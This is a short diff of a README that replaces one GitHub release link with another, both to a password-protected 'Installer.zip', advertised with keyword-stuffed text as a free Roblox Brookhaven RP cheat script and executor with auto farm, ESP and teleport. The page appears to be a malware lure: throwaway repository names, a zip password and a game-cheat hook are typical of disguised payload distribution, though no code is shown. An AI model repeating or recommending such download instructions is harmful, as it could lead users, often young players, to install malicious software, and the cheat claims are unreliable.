@@ -1,5 +1,5 @@
-# [DOWNLOAD LINK](https://github.com/Instlalerzv/installz/releases/download/install/Installer.zip)
-# PASSWORD : 2025
+# [DOWNLOAD LINK](https://github.com/bow-coverbang/installerz/releases/download/install/Installer.zip) 
+ # PASSWORD : 2025 
 # Roblox Brookhaven RP Script 🚀 Roblox Brookhaven RP Script & Executor 🚀 Roblox Brookhaven RP Script Powerful Exploit
 
 Roblox Brookhaven RP Script & Executor unlocks powerful exploits like auto farm, boss kill, ESP, fast raids, and teleport. Level up faster, defeat enemies easily, and dominate the game with the safest and most advanced script. Download now for free and enhance your gameplay.
